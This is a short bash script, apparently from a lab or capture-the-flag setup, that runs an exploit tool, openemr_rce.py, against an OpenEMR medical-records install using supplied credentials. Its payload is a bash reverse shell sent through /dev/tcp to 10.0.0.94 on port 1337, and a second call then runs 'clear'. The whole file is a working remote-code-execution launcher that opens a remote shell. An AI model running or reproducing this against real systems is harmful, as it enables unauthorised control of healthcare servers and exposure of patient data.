#!/bin/bash
# username is first argument, password is second argument
python3 openemr_rce.py  -u $1 -p $2 -c 'bash -i >& /dev/tcp/10.0.0.94/1337 0>&1 &' http://10.0.0.157/openemr
python3 openemr_rce.py  -u $1 -p $2 -c 'clear' http://10.0.0.157/openemr

